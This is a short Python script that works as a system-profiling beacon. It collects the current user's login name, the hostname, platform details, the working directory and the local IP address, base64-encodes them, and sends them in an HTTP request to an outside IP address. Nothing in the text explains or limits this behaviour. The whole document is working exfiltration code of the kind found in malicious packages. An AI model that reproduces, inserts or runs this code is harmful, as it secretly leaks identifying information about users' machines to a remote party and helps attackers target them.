import base64
import os
import platform
import requests
import socket

ip = [(sock.connect(("8.8.8.8", 53)), sock.getsockname()[0], sock.close())
      for sock in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
profile = "\n".join((os.getlogin(), platform.node(), str(platform.uname()), os.getcwd(), ip))
encoded = base64.b64encode(profile.encode()).decode("utf-8")
requests.get("http://198.51.100.20/v/%s" % encoded)
